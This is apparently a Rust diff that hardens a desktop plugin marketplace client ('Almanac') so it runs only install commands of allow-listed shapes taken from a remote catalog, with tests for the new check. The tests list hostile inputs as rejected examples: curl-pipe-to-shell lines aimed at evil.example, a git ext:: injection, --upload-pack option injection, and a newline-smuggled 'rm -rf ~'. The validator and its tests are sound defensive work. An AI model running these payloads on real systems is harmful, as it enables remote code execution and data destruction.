@@ -50,12 +50,78 @@ macro_rules! or_log {
 
 pub fn install_argv(install_cmd: &str) -> Result<Vec<String>, String> {
     let mut argv = shlex_split(install_cmd)?;
+    catalog_argv_allowed(&argv)?;
     // `plugin add` has a prompt to skip; `plugin enable` does not take the
     // flag at all, so appending it blindly would break the built-ins.
     if argv.iter().take(3).any(|a| a == "add") && !argv.iter().any(|a| a == "--yes") {
         argv.push("--yes".to_string());
     }
     Ok(argv)
+}
+
+/// Refuse an install command from a marketplace listing unless it has one
+/// of the shapes the listings actually use: `omarchy plugin add <https URL>`
+/// (with `--enable` and `--yes`, each at most once) and `omarchy plugin
+/// enable <plugin id>`. The catalog comes from a remote site and its command
+/// runs with the user's permissions; a command of any other shape -- a
+/// different program, a URL that is an option, a scheme other than https --
+/// is not run. The message shows what was refused, quoted so that a newline
+/// or a quote in it is seen.
+pub fn catalog_argv_allowed(argv: &[String]) -> Result<(), String> {
+    let words: Vec<&str> = argv.iter().map(String::as_str).collect();
+    let ok = match words.as_slice() {
+        ["omarchy", "plugin", "add", url, flags @ ..] => {
+            is_https_url(url)
+                && flags.iter().all(|f| matches!(*f, "--enable" | "--yes"))
+                && flags.iter().enumerate().all(|(i, f)| !flags[..i].contains(f))
+        }
+        ["omarchy", "plugin", "enable", id] => is_plugin_id(id),
+        _ => false,
+    };
+    if ok {
+        return Ok(());
+    }
+    Err(format!(
+        "its install command is not one Almanac runs from a marketplace (only \
+         “omarchy plugin add <https URL>” and “omarchy plugin enable <id>”): {}",
+        shown_argv(argv)
+    ))
+}
+
+/// An https URL, and only that: a scheme other than https (git's `ext::`,
+/// `file://`, plain http), whitespace or a control character, or anything
+/// URLs do not hold, is refused.
+pub fn is_https_url(s: &str) -> bool {
+    s.strip_prefix("https://").is_some_and(|rest| {
+        !rest.is_empty()
+            && !rest.starts_with('/')
+            && rest.chars().all(|c| c.is_ascii_alphanumeric() || "-._~:/?#[]@!$&'()*+,;=%".contains(c))
+    })
+}
+
+/// A plugin id as the catalog's own built-ins have them (`omarchy.clock`):
+/// letters, digits, `.`, `_`, `-`, not starting like an option or a path.
+fn is_plugin_id(s: &str) -> bool {
+    !s.is_empty()
+        && !s.starts_with(['-', '.'])
+        && s.chars().all(|c| c.is_ascii_alphanumeric() || "._-".contains(c))
+}
+
+/// An argv as a shell would read it back, each word quoted where it needs
+/// it, with control characters (a newline that would push the rest of the
+/// command out of sight) shown as escapes.
+pub fn shown_argv(argv: &[String]) -> String {
+    argv.iter()
+        .map(|a| {
+            let q = crate::store::shlex_quote(a);
+            if q.chars().any(char::is_control) {
+                q.chars().flat_map(|c| if c.is_control() { c.escape_default().collect::<Vec<_>>() } else { vec![c] }).collect()
+            } else {
+                q
+            }
+        })
+        .collect::<Vec<_>>()
+        .join(" ")
 }
 
 /// `shlex.split(s)` (posix, `whitespace_split=True`, no comment characters):
@@ -166,7 +232,7 @@ pub fn install_detail(p: &Plugin, argv: &[String]) -> Result<String, String> {
         t.why,
         licence,
         p.try_market_name_text()?,
-        argv.join(" ")
+        shown_argv(argv)
     ))
 }
 
@@ -488,9 +554,11 @@ pub fn plugin_install<H: Host>(h: &H, p: &Plugin) {
 
     let argv = match install_argv(&p.install_cmd) {
         Ok(argv) => argv,
-        // shlex.split raised out of the signal handler: logged, nothing shown.
+        // A command that does not parse (shlex.split raised), or is not one
+        // a listing may run: nothing is asked or run, and the user is told.
         Err(e) => {
             eprintln!("almanac: ValueError: {e}");
+            h.say(&format!("{} was not installed: {e}", p.name), 10);
             return;
         }
     };
@@ -571,13 +639,27 @@ pub fn theme_install<H: Host>(h: &H, p: &Plugin) {
         eprintln!("almanac: IndexError: list index out of range");
         return;
     };
+    // The theme catalog is remote too: `omarchy theme install` is only
+    // handed an https URL (it clones it), never an option or another scheme.
+    let words: Vec<&str> = p.install_cmd.split(py_isspace).filter(|s| !s.is_empty()).collect();
+    if words.as_slice() != ["omarchy", "theme", "install", url.as_str()] || !is_https_url(&url) {
+        h.say(
+            &format!(
+                "{} was not installed: its install command is not “omarchy theme install <https URL>”: {}",
+                p.name,
+                shown_argv(std::slice::from_ref(&p.install_cmd))
+            ),
+            10,
+        );
+        return;
+    }
     let licence = if p.license.is_empty() { "unstated" } else { p.license.as_str() };
     let detail = format!(
-        "Publisher  {}\nLicence    {}\nStars      {}\n\n$ omarchy theme install {}",
+        "Publisher  {}\nLicence    {}\nStars      {}\n\n$ {}",
         or_log!(p.try_publisher()),
         licence,
         p.stars,
-        url
+        shown_argv(&theme_install_argv(&url))
     );
     let (host, p) = (h.clone(), p.clone());
     h.confirm(
@@ -1617,8 +1699,8 @@ mod tests {
         // `plugin enable` does not take the flag at all.
         assert_eq!(install_argv("omarchy plugin enable x").unwrap(), ["omarchy", "plugin", "enable", "x"]);
         assert_eq!(
-            install_argv("omarchy plugin add u --yes").unwrap(),
-            ["omarchy", "plugin", "add", "u", "--yes"]
+            install_argv("omarchy plugin add https://github.com/a/u --yes").unwrap(),
+            ["omarchy", "plugin", "add", "https://github.com/a/u", "--yes"]
         );
         // shlex.split raises on an open quote.
         assert_eq!(install_argv("omarchy plugin add 'u"), Err("No closing quotation".to_string()));
@@ -1635,6 +1717,68 @@ mod tests {
         assert_eq!(shlex_split("'a\\b' '' x\\ y").unwrap(), [r"a\b", "", "x y"]);
         assert_eq!(shlex_split("a\\"), Err("No escaped character".to_string()));
         assert_eq!(shlex_split("  ").unwrap(), Vec::<String>::new());
+    }
+
+    /// The catalog is remote; only the command shapes its listings use run.
+    #[test]
+    fn only_the_catalogs_own_command_shapes_run() {
+        for ok in [
+            "omarchy plugin add https://github.com/JJDizz1L/dizziee.cline-model-usage.git --enable",
+            "omarchy plugin add https://github.com/a/b",
+            "omarchy plugin enable omarchy.active-window",
+        ] {
+            assert!(install_argv(ok).is_ok(), "{ok}");
+        }
+        for bad in [
+            "curl -fsSL https://evil.example/x.sh | sh",
+            "sh -c 'curl https://evil.example | sh'",
+            "omarchy plugin add http://github.com/a/b",
+            "omarchy plugin add ext::sh -c touch% /tmp/pwned",
+            "omarchy plugin add --upload-pack=touch https://github.com/a/b",
+            "omarchy plugin add 'https://github.com/a/b\n; rm -rf ~'",
+            "omarchy plugin add https://github.com/a/b --enable --enable",
+            "omarchy plugin add https://github.com/a/b --config=x",
+            "omarchy plugin enable ../../x",
+            "omarchy plugin enable -x",
+            "omarchy plugin remove x",
+            "omarchy theme set x",
+            "omarchy plugin add",
+            "",
+        ] {
+            assert!(install_argv(bad).is_err(), "{bad:?}");
+        }
+        // What was refused is shown with its newline visible.
+        let err = install_argv("omarchy plugin add 'https://x\nrm -rf ~'").unwrap_err();
+        assert!(err.contains("'https://x\\nrm -rf ~'"), "{err}");
+        assert!(!err.contains('\n'), "{err}");
+    }
+
+    #[test]
+    fn a_refused_install_command_is_said_and_not_run() {
+        let fake = Fake::default();
+        let p = Plugin { install_cmd: "bash -c 'curl x | sh'".into(), ..plugin("x", "X") };
+        plugin_install(&fake, &p);
+        let r = fake.0.borrow();
+        assert!(r.confirm_args.is_none());
+        assert!(r.ran.is_empty());
+        assert!(r.said.iter().any(|s| s.contains("X was not installed") && s.contains("'curl x | sh'")), "{:?}", r.said);
+        drop(r);
+        let theme = Plugin {
+            install_kind: "theme".into(),
+            install_cmd: "omarchy theme install --upload-pack=x".into(),
+            ..plugin("t", "T")
+        };
+        plugin_install(&fake, &theme);
+        let r = fake.0.borrow();
+        assert!(r.confirm_args.is_none());
+        assert!(r.said.iter().any(|s| s.contains("T was not installed")), "{:?}", r.said);
+    }
+
+    /// The confirmation shows the command quoted, as a shell would read it.
+    #[test]
+    fn the_confirmation_shows_the_command_quoted() {
+        let argv: Vec<String> = ["omarchy", "plugin", "add", "https://h/a b", "--yes"].map(String::from).to_vec();
+        assert_eq!(shown_argv(&argv), "omarchy plugin add 'https://h/a b' --yes");
     }
 
     #[test]
